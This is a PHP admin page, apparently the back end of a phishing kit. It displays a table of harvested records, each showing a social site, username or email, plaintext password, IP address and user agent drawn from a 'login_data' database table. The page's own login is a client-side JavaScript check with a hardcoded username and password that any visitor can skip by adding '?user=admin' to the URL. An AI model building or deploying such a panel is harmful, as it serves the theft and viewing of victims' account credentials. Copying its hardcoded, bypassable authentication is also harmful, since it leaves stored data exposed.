<?php include('../config.php');?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.1/css/dataTables.bootstrap5.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
    <title>Admin Page</title>
</head>
<header>

</header>
<body>
    <?php
        if(!isset($_GET['user'])){
            echo '
            <div class="container mt-5 pt-5">
                <div class="col-lg-5 m-auto">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" class="form-control username">
                    </div>
                    <div class="form-group mt-4">
                        <label for="password">Password</label>
                        <input type="password" class="form-control password">
                    </div>
                    <div class="form-group text-center mt-4">
                        
                        <input type="button" class="col-lg-12 btn btn-primary login" value="login">
                    </div>
                </div>
            </div>
            ';
        }
        else{
            echo '
            <div class="container pt-5 pb-5">
            <h3> JillaKD Dashboard</h3>
            <div class="row">
                <div class="col-sm">
                    <div class="table-wrap">
                        <table id="mywp_dataTable" class="table table-striped table-hover w-100 display">
                            <thead>
                                <tr>
                                    <th>Social</th>
                                    <th>Username/Email</th>
                                    <th>Password</th>
                                    <th>Ipv4</th>
                                    <th>User Agent</th>
                                    <th>Date</th>
                                    
                                </tr>
                            </thead>
                            <tbody>
            ';
                        $sql = mysqli_query($conn, "SELECT *
                                FROM login_data
                                WHERE status = 'Active'
                                ");
                                while($mywp_data = mysqli_fetch_assoc($sql)){
                               echo' 
                               <tr>
                                    <td>'.$mywp_data['site'].'</td>
                                    <td style="color: blue;">'.$mywp_data['username'].'</td>
                                    <td style="color:red;">'.$mywp_data['password'].'</td>
                                    <td>'.$mywp_data['ip'].'</td>
                                    <td>'.$mywp_data['user_agent'].'</td>
                                    <td>'.$mywp_data['date'].'</td>  
                                </tr>
                            ';
                            };
                            echo '
                            </tbody>
                            <tfoot>
                            <tr>
                                    <th>Social</th>
                                    <th>Username/Email</th>
                                    <th>Password</th>
                                    <th>Ipv4</th>
                                    <th>User Agent</th>
                                    <th>Date</th>
                                </tr>
                            </tfoot>
                        </table>
                    </div>
                </div>
            </div>
        </div>
                            ';

        }
    ?>
    

<!-- Jquery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<!-- Datatables -->
<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.1/js/dataTables.bootstrap5.min.js"></script>
<!-- Bootstrap -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $(document).ready(function(){
        $('#mywp_dataTable').DataTable({
            order: [[0, 'desc']],
        });
        $(".login").click(function(){
            var username = $(".username").val();
            var password = $(".password").val();

            if(username != 'jillakd'){
                alert('User Login Faild - username');
            }
            else if(password != 'Arunarun@2626'){
                alert('User Login Faild - Pass');
            }
            else{
                window.location = 'index.php?user=admin'
                // $.post("index.php",
                //     {
                //     name: "user",
                //     })
            }
        })
    });
</script>
</body>
</html>